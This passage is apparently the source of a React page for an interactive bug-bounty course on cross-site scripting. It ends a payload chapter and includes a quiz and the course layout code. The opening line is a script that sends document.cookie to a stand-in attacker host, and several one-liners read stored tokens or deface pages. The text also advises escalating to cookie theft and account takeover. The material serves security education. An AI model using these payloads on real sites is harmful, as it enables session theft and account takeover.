<script>navigator.sendBeacon('https://attacker.com/steal',document.cookie)</script>`}
        </pre>

        <h3>12. Useful One-Liners</h3>
        <pre className="payload-box">
{`<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
<script>alert(localStorage.getItem('token'))</script>
<script>alert(sessionStorage.getItem('token'))</script>
<script>document.body.innerHTML='Hacked by XSS'</script>
<script>document.body.style.background='red'</script>`}
        </pre>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Start with basic payloads first. If they get blocked, move to event-based,
            encoding-based, and WAF bypass payloads. Always try to show real impact
            (cookie stealing, account takeover) instead of just alert(1).
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What should you focus on after finding a basic XSS (alert(1))?",
      options: [
        "Stop testing and report only the alert",
        "Escalate to real impact such as cookie theft or account takeover",
        "Only test on the homepage",
        "Change the payload to use only CSS"
      ],
      correct: "Escalate to real impact such as cookie theft or account takeover",
    },
  },
];

const XSS = () => {
  const [activeChapter, setActiveChapter] = useState(chapters[0]);
  const [selectedOption, setSelectedOption] = useState("");
  const [showCongrats, setShowCongrats] = useState(false);
  const [completedChapters, setCompletedChapters] = useState([]);

  const handleSubmit = () => {
    if (!activeChapter.quiz) return;

    if (selectedOption === activeChapter.quiz.correct) {
      setShowCongrats(true);
      if (!completedChapters.includes(activeChapter.id)) {
        setCompletedChapters([...completedChapters, activeChapter.id]);
      }
    } else {
      alert("❌ Wrong answer. Try again!");
    }
  };

  const closeCongrats = () => {
    setShowCongrats(false);
    setSelectedOption("");
  };

  return (
    <div className="article-page">
      <Navbar />

      {/* ===== TOP TITLE ===== */}
      <section className="article-header">
        <div className="article-header-content">
          <Link to="/bug-bounty" className="back-link">
            ← Back to Bug Bounty Courses
          </Link>
          <h1>
            The ultimate Bug Bounty guide to{" "}
            <span className="gradient-text">Cross-Site Scripting (XSS)</span>
          </h1>
          <p className="article-date">Interactive Deep Course • 2026</p>
        </div>
      </section>

      {/* ===== BIG IMAGE ===== */}
      <section className="article-banner">
        <img
          src="https://plain-apac-prod-public.komododecks.com/202610/03/JLWspp1BwpVFXPBeITBr/image.png"
          alt="XSS Guide"
          onError={(e) => {
            e.target.src =
              "https://via.placeholder.com/1200x450/1a0b2e/a855f7?text=Cross-Site+Scripting+(XSS)";
          }}
        />
      </section>

      {/* ===== MAIN CONTENT ===== */}
      <section className="article-body">
        <div className="article-container">
          {/* LEFT SIDEBAR */}
          <aside className="article-sidebar">
            <h3>Course Content</h3>
            <ul>
              {chapters.map((chapter) => (
                <li
                  key={chapter.id}
                  className={`${activeChapter.id === chapter.id ? "active" : ""} ${
                    completedChapters.includes(chapter.id) ? "completed" : ""
                  }`}
                  onClick={() => {
                    setActiveChapter(chapter);
                    setSelectedOption("");
                  }}
                >
                  {chapter.title}
                  {completedChapters.includes(chapter.id) && (
                    <span className="check-mark">✓</span>
                  )}
                </li>
              ))}
            </ul>
          </aside>

          {/* RIGHT CONTENT */}
          <div className="article-content">
            {activeChapter.content}

            {activeChapter.quiz && (
              <div className="quiz-box">
                <h3>Quick Check</h3>
                <p className="quiz-question">{activeChapter.quiz.question}</p>
                <div className="quiz-options">
                  {activeChapter.quiz.options.map((opt) => (
                    <label key={opt} className="quiz-option">
                      <input
                        type="radio"
                        name="quiz"
                        value={opt}
                        checked={selectedOption === opt}
                        onChange={(e) => setSelectedOption(e.target.value)}
                      />
                      <span>{opt}</span>
                    </label>
                  ))}
                </div>
                <button className="quiz-submit" onClick={handleSubmit}>
                  Submit Answer
                </button>
              </div>
            )}
          </div>
        </div>
      </section>

      {showCongrats && (
        <div className="congrats-overlay">
          <div className="congrats-modal">
            <div className="congrats-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p>You completed this step successfully.</p>
            <button onClick={closeCongrats}>Continue Learning</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default XSS;